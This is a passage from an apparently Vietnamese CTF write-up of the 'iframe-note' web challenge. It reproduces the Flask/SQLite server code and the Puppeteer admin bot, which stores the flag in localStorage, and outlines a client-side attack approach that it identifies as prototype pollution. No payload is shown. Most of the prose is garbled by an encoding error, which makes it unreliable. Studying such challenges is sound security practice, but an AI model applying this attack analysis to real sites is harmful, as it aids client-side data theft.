	res.locals.nonce = nonce;
    next();
});
```



## iframe-note

![image](https://hackmd.io/_uploads/H1ubND9KC.png)


M·ªôt chall v·ªõi python flask + sqlite + pupperteer for report with admin.
- Nh√¨n th·∫•y bot l√† ta nghƒ© ngay ƒë·∫øn kh·∫£ nƒÉng cao l√† vul client nh∆∞ xss, csrf,...

-> ƒëi v√†o ph√¢n t√≠ch m√£ ngu·ªìn c·ªßa server
### analyst

- C∆° b·∫£n th√¨ ch∆∞∆°ng tr√¨nh c√≥ c√≥ nh∆∞ sau:

```
from flask import Flask, session, request, flash, redirect, url_for, render_template
import hashlib
import secrets
import sqlite3
import os

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", secrets.token_hex(16))

conn = sqlite3.connect("iframe-note.db", isolation_level=None)

cursor = conn.cursor()
cursor.execute('pragma journal_mode=WAL')
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    username TEXT PRIMARY KEY, password TEXT NOT NULL
);
""")
cursor.execute("""
CREATE TABLE IF NOT EXISTS iframes (
    id TEXT PRIMARY KEY, author TEXT NOT NULL, name TEXT NOT NULL, url TEXT NOT NULL, style TEXT
);
""")
cursor.close()

def add_user(username, password):
    cursor = conn.cursor()
    cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashlib.sha256(password.encode()).hexdigest()))
    cursor.close()

def add_iframe(author, name, url, style = None):
    cursor = conn.cursor()
    cursor.execute("INSERT INTO iframes (id, author, name, url, style) VALUES (?, ?, ?, ?, ?)", (secrets.token_hex(16), author, name, url, style))
    cursor.close()

def get_iframe(id):
    cursor = conn.cursor()
    iframe = cursor.execute("SELECT name, url, style FROM iframes WHERE id = ?", (id,)).fetchone()
    cursor.close()
    return iframe

def get_iframes(author):
    cursor = conn.cursor()
    iframes = cursor.execute("SELECT id, name FROM iframes WHERE author = ?", (author,)).fetchall()
    cursor.close()
    return iframes

def get_user(username):
    cursor = conn.cursor()
    user = cursor.execute("SELECT username, password FROM users WHERE username = ?", (username,)).fetchone()
    cursor.close()
    return user

# might fail since multiple workers try to all add admin
try:
    add_user("admin", os.getenv("ADMIN_PASSWORD", "erm"))
except:
    pass

@app.get("/")
def index():
    if session.get("user"):
        iframes = get_iframes(session["user"])
        return render_template("home.html", user=session["user"], iframes=iframes)
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username, password = request.form["username"], request.form["password"]
        user = get_user(username)
    
        if user and user[1] == hashlib.sha256(password.encode()).hexdigest():
            session["user"] = username
            return redirect(url_for("index"))

        flash("invalid username or password", "error")
        return redirect(url_for("login"))
    return render_template("login.html")

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username, password = request.form["username"], request.form["password"]

        if len(username) < 5 or len(password) < 7:
            flash("username must be at least 5 characters long and password must be at least 7 characters long", "error")
            return redirect(url_for("register"))
        
        if not username.isalnum():
            flash("username must be alphanumeric", "error")
            return redirect(url_for("register"))

        if username in password:
            flash("username cannot be contained in the password", "error")
            return redirect(url_for("register"))

        if get_user(username):
            flash("username already taken", "error")
            return redirect(url_for("register"))
        
        add_user(username, password)
        session["user"] = username

        return redirect(url_for("index"))
    return render_template("register.html")

@app.post("/create")
def create():
    if not session.get("user"):
        flash("you must be logged in to create an iframe", "error")
        return redirect(url_for("index"))
    
    if session["user"] == "admin":
        flash("admin cannot create iframes", "error")
        return redirect(url_for("index"))

    name, url, style = request.form["name"], request.form["url"], request.form["style"]

    if not name or not url:
        flash("name and url cannot be empty", "error")
        return redirect(url_for("index"))

    if not url.lower().startswith("http"):
        flash("url must start with http or https", "error")
        return redirect(url_for("index"))
    
    add_iframe(session["user"], name, url, style)
    return redirect(url_for("index"))

@app.get("/view")
def view():
    return render_template("view.html")

@app.get("/iframe/<id>")
def iframe(id):
    iframe = get_iframe(id)
    if not iframe:
        return { "error": "iframe not found" }
    return { "name": iframe[0], "url": iframe[1], "style": iframe[2] }
```

-> ƒë·∫ßu ti√™n th√¨ s·∫Ω kh·ªüi t·∫°o c√°c b·∫£ng `users` `iframes` v·ªõi c√°c c·ªôt ch·ª©a d·ªØ li·ªáu t∆∞∆°ng ·ª©ng -> insert username `admin` v·ªõi secret passwd v√†o trong b·∫£ng users.

C√°c api ch√≠nh:
#### api /
- S·∫Ω tr·∫£ ra t·∫•t c·∫£ id + name c·ªßa template t∆∞∆°ng ·ª©ng v·ªõi session user sau ƒë√≥ hi·ªÉn th·ªã ra `home`

#### api /login + /register -> ƒëƒÉng k√≠ & ƒëƒÉng nh·∫≠p

#### api /create
- Nh·∫≠n `name, url, style` t·ª´ client -> th√™m d·ªØ li·ªáu v√†o trong b·∫£ng users

#### api /view -> hi·ªÉn th·ªã view template

#### api /iframe/``<id>``

- Tr·∫£ ra `name, url, style` t∆∞∆°ng ·ª©ng v·ªõi id sau ƒë√≥ hi·ªÉn th·ªã k·∫øt qu·∫£ tr·ª±c ti·∫øp d∆∞·ªõi d·∫°ng json

- Chuy·ªÉn qua m√£ c·ªßa bot-admin:


```
// npm i puppeteer
const puppeteer = require("puppeteer");

const TEST_USER = "test_user";
const TEST_PASSWORD = "test_password";
const FLAG = "corctf{test_flag}";
const SITE = "https://iframe-note.be.ax";

function sleep(time) {
    return new Promise(resolve => {
        setTimeout(resolve, time)
    })
}

const visit = async (url) => {
    if (!/^https:\/\/iframe-note\.be\.ax\/view\?id=[A-Fa-f0-9]+$/.test(url)) {
        console.log('[warning]: invalid url! you cannot submit this to the admin bot.');
    }

    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            pipe: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--js-flags=--noexpose_wasm,--jitless",
            ],
            dumpio: true
        });

        const ctx = browser.createBrowserContext();

        const page = await ctx.newPage();
        await page.goto(`${SITE}/login`, { timeout: 5000, waitUntil: 'networkidle2' });

        await page.evaluate((flag) => {
            localStorage.setItem("flag", flag);
        }, FLAG);

        await page.waitForSelector('input[name="username"]', { timeout: 5000 });

        await page.type('input[name="username"]', TEST_USER);
        await page.type('input[name="password"]', TEST_PASSWORD);
        await page.click('input[type="submit"]');
        
        await sleep(3000);
        await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' });

        await sleep(8000);

        await browser.close();
        browser = null;
    } catch (err) {
        console.log(err);
    } finally {
        if (browser) await browser.close();
    }
};

visit("TARGET_URL");
```
- ƒê·∫ßu ti√™n l√† bot ch·ªâ nh·∫≠n url ƒë·∫øn view/?id=[replace] -> s·∫Ω di chuy·ªÉn ƒë·∫øn trang login -> l∆∞u flag v√†o trong localStorage c·ªßa tr√¨nh duy·ªát -> nh·∫≠p username + password ƒëƒÉng nh·∫≠p -> sleep 3s -> di chuy·ªÉn ƒë·∫øn url v·ª´a nh·∫≠n.
### detect

- Prototype polution